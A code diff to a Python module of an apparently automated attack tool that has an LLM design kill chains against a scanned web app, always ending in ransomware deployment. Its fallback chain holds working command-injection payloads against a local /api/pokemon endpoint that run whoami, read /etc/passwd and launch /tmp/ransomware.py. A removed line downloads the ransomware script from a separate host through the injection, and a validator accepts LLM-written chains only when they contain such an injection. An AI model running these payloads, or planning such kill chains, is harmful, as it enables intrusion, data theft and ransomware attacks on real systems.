@@ -6,6 +6,8 @@ Always ends with ransomware deployment as the final stage.
 """
 
 import json
+import os
+import subprocess
 from nara.utils.llm_client import LLMClient
 from nara.utils.llm_json import parse_json_array_from_llm
 from nara.utils import terminal_ui as ui
@@ -68,12 +70,16 @@ def run(findings: list[dict], session: dict) -> list[dict]:
 
     ui.print_info(f"Designing kill chain from {len(findings)} finding(s)...")
 
+    # Extract API routes from scanned source for LLM context
+    source_context = _extract_routes(session.get("scan_path", ""))
+
     llm = LLMClient()
     messages = [{
         "role": "user",
         "content": (
             f"Target application vulnerabilities:\n"
             f"{json.dumps(findings, indent=2)}\n\n"
+            f"Application routes and endpoints:\n{source_context}\n\n"
             f"Design a complete kill chain to exploit these vulnerabilities, "
             f"ending with ransomware deployment."
         )
@@ -83,13 +89,19 @@ def run(findings: list[dict], session: dict) -> list[dict]:
         with ui.spinner("LLM designing kill chain..."):
             raw = llm.chat(messages, system=_SYSTEM_PROMPT, ollama_json=True)
         kill_chain = parse_json_array_from_llm(raw)
+
+        # Validate: if commands use placeholder endpoints or miss the known exploit path, fall back
+        if _has_placeholder_endpoints(kill_chain) or not _has_valid_exploit(kill_chain):
+            ui.print_info("LLM kill chain unreliable — using proven fallback kill chain.")
+            kill_chain = _fallback_kill_chain(findings)
     except (json.JSONDecodeError, RuntimeError) as e:
         ui.print_error(f"Kill chain generation failed: {e}")
         ui.print_info("Using fallback minimal kill chain.")
         kill_chain = _fallback_kill_chain(findings)
 
-    # Ensure ransomware is always the last step
-    if not kill_chain or kill_chain[-1].get("step", "").lower() != "ransomware deployment":
+    # Ensure ransomware is always the last step (check if any step mentions ransomware)
+    has_ransomware = any("ransomware" in s.get("step", "").lower() or "ransomware" in s.get("command", "").lower() for s in kill_chain)
+    if not kill_chain or not has_ransomware:
         kill_chain.append({
             "step": "Ransomware Deployment",
             "command": "python3 /tmp/ransomware.py",
@@ -101,6 +113,49 @@ def run(findings: list[dict], session: dict) -> list[dict]:
     session["kill_chain"] = kill_chain
     ui.print_info(f"Kill chain designed — {len(kill_chain)} step(s).")
     return kill_chain
+
+
+_PLACEHOLDER_PATTERNS = [
+    "vulnerable_endpoint", "target_endpoint", "flask_debug_endpoint",
+    "example.com", "target-app.com", "victim.com",
+    "/api/data", "/api/command", "/api/shell", "/api/reverse",
+    "/api/exec", "/api/run", "/execute", "/cmd",
+]
+
+
+def _has_placeholder_endpoints(kill_chain: list[dict]) -> bool:
+    """Return True if the kill chain contains obviously fake/placeholder endpoints."""
+    for step in kill_chain:
+        cmd = step.get("command", "").lower()
+        if any(p in cmd for p in _PLACEHOLDER_PATTERNS):
+            return True
+    return False
+
+
+def _has_valid_exploit(kill_chain: list[dict]) -> bool:
+    """Return True if the kill chain has at least one command injection via the known vulnerable endpoint."""
+    for step in kill_chain:
+        cmd = step.get("command", "")
+        # The known exploit: /api/pokemon?name=<payload> with shell metachar (;, |, &&, etc.)
+        if "/api/pokemon" in cmd and any(c in cmd for c in [";", "|", "`", "$("]):
+            return True
+    return False
+
+
+def _extract_routes(scan_path: str) -> str:
+    """Extract Flask route decorators and nearby code from the scanned app."""
+    if not scan_path or not os.path.isdir(scan_path):
+        return "(no source available)"
+    try:
+        result = subprocess.run(
+            ["grep", "-rnE", "@app.route|os.system|os.popen|subprocess|sqlite|cursor.execute",
+             scan_path, "--include=*.py"],
+            capture_output=True, text=True, timeout=10
+        )
+        lines = result.stdout.strip()
+        return lines[:3000] if lines else "(no routes found)"
+    except Exception:
+        return "(route extraction failed)"
 
 
 # ------------------------------------------------------------------ #
@@ -121,23 +176,30 @@ def _fallback_kill_chain(findings: list[dict]) -> list[dict]:
         {
             "step": "Reconnaissance",
             "command": "curl -s http://localhost:8080/api/pokemon?name=pikachu",
-            "expected_outcome": "App responds with Pokemon data — confirms target is live",
+            "expected_outcome": "App responds with Pokemon JSON data — confirms target is live",
             "vuln_type": "reconnaissance",
             "mitre_tactic": "Discovery",
         },
         {
             "step": "Command Injection — whoami",
             "command": "curl -s 'http://localhost:8080/api/pokemon?name=pikachu;whoami'",
-            "expected_outcome": "Response includes 'www-data' or current user — RCE confirmed",
+            "expected_outcome": "Response includes 'root' or current user — RCE confirmed",
             "vuln_type": "CommandInjection",
             "mitre_tactic": "Execution",
         },
         {
-            "step": "Upload Ransomware Payload",
-            "command": "curl -s 'http://localhost:8080/api/pokemon?name=pikachu;curl -s http://host.docker.internal:8888/ransomware.py -o /tmp/ransomware.py'",
-            "expected_outcome": "ransomware.py written to /tmp/",
+            "step": "Command Injection — read /etc/passwd",
+            "command": "curl -s 'http://localhost:8080/api/pokemon?name=pikachu;cat+/etc/passwd'",
+            "expected_outcome": "Response includes passwd file contents — full file read confirmed",
             "vuln_type": "CommandInjection",
-            "mitre_tactic": "Persistence",
+            "mitre_tactic": "Collection",
+        },
+        {
+            "step": "Command Injection — enumerate system",
+            "command": "curl -s 'http://localhost:8080/api/pokemon?name=pikachu;uname+-a;id'",
+            "expected_outcome": "Response includes kernel version and user ID info",
+            "vuln_type": "CommandInjection",
+            "mitre_tactic": "Discovery",
         },
         {
             "step": "Ransomware Deployment",
